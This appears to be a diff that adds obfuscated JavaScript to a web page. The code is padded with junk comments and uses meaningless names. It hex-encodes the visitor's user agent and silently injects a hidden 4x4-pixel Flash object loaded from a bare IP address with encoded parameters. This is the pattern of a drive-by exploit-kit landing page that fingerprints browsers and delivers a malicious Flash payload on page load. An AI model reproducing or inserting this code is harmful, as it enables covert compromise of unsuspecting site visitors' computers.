@@ -1,0 +1,23 @@
+/*s97472d6364hssfj2292fs*/function hgfgerdfgdf(num, width){/*s68738d94862hfj50931fs*/var vcbcvbnfd = "0123456789abcdef";var hgfgghf = "";/*s40233d51330hfj12053fs*/var hgfgerdfgdf = vcbcvbnfd.substr(num & 0xF, 1);while (num > 0xF) {num = num >>> 4;hgfgerdfgdf = vcbcvbnfd.substr(num & 0xF, 1) + hgfgerdfgdf;}var width = (width ? width : 0); while (hgfgerdfgdf.length < width)hgfgerdfgdf = "0" + hgfgerdfgdf;return hgfgerdfgdf;}/*s92101d2073hfj10352fs*/function ghnvbn(u, k) {var fr=String.fromCharCode;var c="", b="", d="", f=fr(0x20), g=fr(0), v=fr(0x22);/*s2289d15007hfj31668fs*/var app=k+v+f+v+u+v+f+v+navigator.userAgent+v+g+g+g+g;app.length%2 && (app+=g);for (var e = 0; e < app.length; e++) {b = hgfgerdfgdf(app.charCodeAt(e),2);d = hgfgerdfgdf(app.charCodeAt(e+1),2);/*sdhd45802hfs*/c += b + d;/*s21321d50209hfj4645fs*/e += 1;}return c;}/*s91286dfsffd*/
+
+	function hfdf(fus,asd)
+	{
+	var cvbfh = '<object classid="clsid:d27cdb6e-ae6d-11cf-96b8-444553540000" allowScriptAccess=always width="4" height="4">';
+	cvbfh = cvbfh + '<param name="movie" value="' + fus + '" />';
+	cvbfh = cvbfh + '<param name="play" value="true"/>';
+	cvbfh = cvbfh + '<param name=FlashVars value="menu=' + asd + '" />';
+	cvbfh = cvbfh + '<!--[if !IE]>-->';
+	cvbfh = cvbfh + '<object type="application/x-shockwave-flash" data="' + fus + '" allowScriptAccess=always width="4" height="4">';
+	cvbfh = cvbfh + '<param name="movie" value="' + fus + '" />';
+	cvbfh = cvbfh + '<param name="play" value="true"/>';
+	cvbfh = cvbfh + '<param name=FlashVars value="menu=' + asd +   '" />';
+	cvbfh = cvbfh + '<!--<![endif]-->';
+	cvbfh = cvbfh + '<!--[if !IE]>--></object><!--<![endif]-->';
+	cvbfh = cvbfh + '</object>';
+
+	var ffert = document.createElement("div");
+	ffert.innerHTML = cvbfh;
+	document.body.appendChild(ffert);
+	} 
+	
+	hfdf("http://195.123.211.217/?NzkyMzUxODQ=&pa=xH_QMrDYbR3FFYDfKPnEUKdEMU7WA0SKwYyZha_VF5yxFDfGpbH1FxzspVydCFyEmvFvdLAHIwGh1UfASwd&ma=hlY8OVVgWoqupjEOGnBSZh5WHqBSKYAtAqZPGRbM52FykybMWIsl0lBeBvWMCyegtW1gS5QsSn6_7VaCO-w&work=NDMxNTAyMjI=", ghnvbn("http://195.123.211.217/?OTM5MjAxMjY=&ma=PojxaHfgQ0m4xcAQ8W9a6r20DSyBOd1sTT_xeNMAtD_cCUR-I42gmnyrMkdsImzhGA6FENjOge&pa=xXzQMvWdbRXQC53EKvncT6NEMVHRHECL2YydmrHTefjaeVWkzrHFTF_yozKASASG6_JtdfJRDQ&shop=MTY0MjA4MTY=","wexykukusw"));
